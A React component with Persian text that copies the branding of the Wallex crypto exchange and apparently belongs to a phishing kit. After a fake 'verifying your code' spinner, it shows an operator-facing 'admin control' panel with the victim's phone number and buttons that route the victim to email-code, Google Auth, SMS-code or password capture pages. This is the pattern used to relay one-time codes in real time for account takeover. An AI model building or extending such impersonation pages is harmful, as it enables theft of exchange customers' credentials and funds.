import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import {
  Loader2,
  Mail,
  Smartphone,
  MessageSquare,
  Lock,
  ShieldCheck,
} from "lucide-react";
import { Button } from "@/components/ui/button";

const Loading = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [showAdminControls, setShowAdminControls] = useState(false);
  const [isProcessing, setIsProcessing] = useState(true);

  const phoneNumber = location.state?.phoneNumber || "";
  const verificationCode = location.state?.verificationCode || "";
  const fromAuth = location.state?.fromAuth || false;

  useEffect(() => {
    // Show loading animation first, then admin controls
    const timer = setTimeout(() => {
      setIsProcessing(false);
      setShowAdminControls(true);
    }, 3000); // Show admin controls after 3 seconds

    return () => clearTimeout(timer);
  }, []);

  const handleAdminAction = (authType: string) => {
    console.log(`Admin selected: ${authType} for user: ${phoneNumber}`);

    // Navigate to the selected authentication method
    switch (authType) {
      case "email":
        navigate("/auth-email", {
          state: { phoneNumber, previousStep: "phone-verification" },
        });
        break;
      case "google":
        navigate("/auth-google", {
          state: { phoneNumber, previousStep: "phone-verification" },
        });
        break;
      case "sms":
        navigate("/auth-sms", {
          state: { phoneNumber, previousStep: "phone-verification" },
        });
        break;
      case "password":
        navigate("/auth-password", {
          state: { phoneNumber, previousStep: "phone-verification" },
        });
        break;
      default:
        console.error("Unknown auth type:", authType);
    }
  };

  const handleCompleteAuth = () => {
    // Complete authentication process
    localStorage.setItem("isAuthenticated", "true");
    localStorage.setItem("userPhone", phoneNumber);
    sessionStorage.removeItem("verificationCode");
    sessionStorage.removeItem("phoneNumber");

    alert("احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
    navigate("/", { replace: true });
  };

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          borderRadius: "16px",
          padding: "40px",
          maxWidth: "500px",
          width: "90%",
          textAlign: "center",
        }}
        className="loading-card"
      >
        {/* Header */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginBottom: "24px",
          }}
        >
          <img
            src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
            alt="صرافی خرید فروش ارزهای دیجیتال"
            style={{
              width: "128px",
              height: "24px",
              objectFit: "contain",
            }}
          />
        </div>

        {isProcessing ? (
          /* Loading State */
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              gap: "20px",
            }}
          >
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                width: "80px",
                height: "80px",
                backgroundColor: "rgb(23, 29, 38)",
                borderRadius: "50%",
              }}
            >
              <Loader2
                className="animate-spin"
                style={{
                  width: "40px",
                  height: "40px",
                  color: "rgb(255, 255, 255)",
                }}
              />
            </div>

            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "8px",
                textAlign: "center",
              }}
            >
              <h2
                style={{
                  fontSize: "18px",
                  fontWeight: "700",
                  color: "rgb(0, 0, 0)",
                  margin: "0",
                }}
              >
                {fromAuth
                  ? "در حال پردازش احراز هویت..."
                  : "در حال بررسی کد تایید..."}
              </h2>
              <p
                style={{
                  fontSize: "14px",
                  color: "rgba(0, 0, 0, 0.6)",
                  margin: "0",
                  lineHeight: "1.5",
                }}
              >
                لطفا صبر کنید، اطلاعات شما در حال بررسی است
              </p>
            </div>

            {/* Progress Dots */}
            <div
              style={{
                display: "flex",
                gap: "8px",
                alignItems: "center",
              }}
            >
              {[0, 1, 2].map((index) => (
                <div
                  key={index}
                  style={{
                    width: "8px",
                    height: "8px",
                    backgroundColor: "rgb(0, 122, 255)",
                    borderRadius: "50%",
                    animation: `bounce ${1.4}s ease-in-out ${index * 0.16}s infinite both`,
                  }}
                />
              ))}
            </div>
          </div>
        ) : (
          /* Admin Controls */
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              gap: "24px",
            }}
          >
            {/* Admin Header */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "12px",
                padding: "16px",
                backgroundColor: "rgb(248, 249, 250)",
                borderRadius: "12px",
                border: "1px solid rgba(0, 0, 0, 0.1)",
                width: "100%",
              }}
            >
              <ShieldCheck
                style={{
                  width: "24px",
                  height: "24px",
                  color: "rgb(0, 122, 255)",
                }}
              />
              <div style={{ textAlign: "right", flex: 1 }}>
                <h3
                  style={{
                    fontSize: "16px",
                    fontWeight: "700",
                    color: "rgb(0, 0, 0)",
                    margin: "0 0 4px 0",
                  }}
                >
                  کنترل ادمین
                </h3>
                <p
                  style={{
                    fontSize: "12px",
                    color: "rgba(0, 0, 0, 0.6)",
                    margin: "0",
                  }}
                >
                  مرحله بعدی احراز هویت را انتخاب کنید
                </p>
              </div>
            </div>

            {/* User Info */}
            <div
              style={{
                padding: "16px",
                backgroundColor: "rgba(0, 122, 255, 0.05)",
                borderRadius: "8px",
                width: "100%",
                textAlign: "right",
              }}
            >
              <p
                style={{
                  fontSize: "14px",
                  color: "rgba(0, 0, 0, 0.8)",
                  margin: "0",
                }}
              >
                کاربر:{" "}
                <strong style={{ direction: "ltr" }}>{phoneNumber}</strong>
              </p>
            </div>

            {/* Admin Action Buttons */}
            <div
              style={{
                display: "grid",
                gridTemplateColumns: "1fr 1fr",
                gap: "12px",
                width: "100%",
              }}
            >
              <Button
                onClick={() => handleAdminAction("email")}
                variant="outline"
                className="h-auto p-4 flex-col gap-2"
                style={{
                  border: "1px solid rgba(0, 0, 0, 0.2)",
                  borderRadius: "8px",
                  backgroundColor: "rgb(255, 255, 255)",
                }}
              >
                <Mail
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgb(0, 122, 255)",
                  }}
                />
                <span style={{ fontSize: "12px", fontWeight: "500" }}>
                  Email Code
                </span>
              </Button>

              <Button
                onClick={() => handleAdminAction("google")}
                variant="outline"
                className="h-auto p-4 flex-col gap-2"
                style={{
                  border: "1px solid rgba(0, 0, 0, 0.2)",
                  borderRadius: "8px",
                  backgroundColor: "rgb(255, 255, 255)",
                }}
              >
                <Smartphone
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgb(219, 68, 55)",
                  }}
                />
                <span style={{ fontSize: "12px", fontWeight: "500" }}>
                  Google Auth
                </span>
              </Button>

              <Button
                onClick={() => handleAdminAction("sms")}
                variant="outline"
                className="h-auto p-4 flex-col gap-2"
                style={{
                  border: "1px solid rgba(0, 0, 0, 0.2)",
                  borderRadius: "8px",
                  backgroundColor: "rgb(255, 255, 255)",
                }}
              >
                <MessageSquare
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgb(34, 197, 94)",
                  }}
                />
                <span style={{ fontSize: "12px", fontWeight: "500" }}>
                  SMS Code
                </span>
              </Button>

              <Button
                onClick={() => handleAdminAction("password")}
                variant="outline"
                className="h-auto p-4 flex-col gap-2"
                style={{
                  border: "1px solid rgba(0, 0, 0, 0.2)",
                  borderRadius: "8px",
                  backgroundColor: "rgb(255, 255, 255)",
                }}
              >
                <Lock
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgb(168, 85, 247)",
                  }}
                />
                <span style={{ fontSize: "12px", fontWeight: "500" }}>
                  Password
                </span>
              </Button>
            </div>

            {/* Complete Authentication Button */}
            <div
              style={{
                width: "100%",
                marginTop: "16px",
                paddingTop: "16px",
                borderTop: "1px solid rgba(0, 0, 0, 0.1)",
              }}
            >
              <Button
                onClick={handleCompleteAuth}
                style={{
                  width: "100%",
                  backgroundColor: "rgb(34, 197, 94)",
                  color: "rgb(255, 255, 255)",
                  borderRadius: "8px",
                  padding: "12px 16px",
                  fontSize: "14px",
                  fontWeight: "500",
                  border: "none",
                  cursor: "pointer",
                }}
              >
                ✅ تکمیل احراز هویت
              </Button>
            </div>
          </div>
        )}

        {/* Security Note */}
        <div
          style={{
            marginTop: "32px",
            padding: "16px",
            backgroundColor: "rgb(248, 249, 250)",
            borderRadius: "8px",
            border: "1px solid rgba(0, 0, 0, 0.1)",
          }}
        >
          <p
            style={{
              fontSize: "12px",
              color: "rgba(0, 0, 0, 0.6)",
              margin: "0",
              lineHeight: "1.4",
            }}
          >
            🔒{" "}
            {showAdminControls
              ? "پنل کنترل ادمین - احراز هویت چندمرحله‌ای"
              : "اطلاعات شما با بالاترین استانداردهای امنیتی محافظت می‌شود"}
          </p>
        </div>
      </div>

      <style jsx>{`
        @keyframes bounce {
          0%,
          80%,
          100% {
            transform: scale(0);
          }
          40% {
            transform: scale(1);
          }
        }

        /* Mobile styles */
        @media (max-width: 1023px) {
          .loading-card {
            border-radius: 0 !important;
            width: 100% !important;
            height: 100vh !important;
            max-width: none !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            padding: 20px !important;
          }
        }
      `}</style>
    </div>
  );
};

export default Loading;
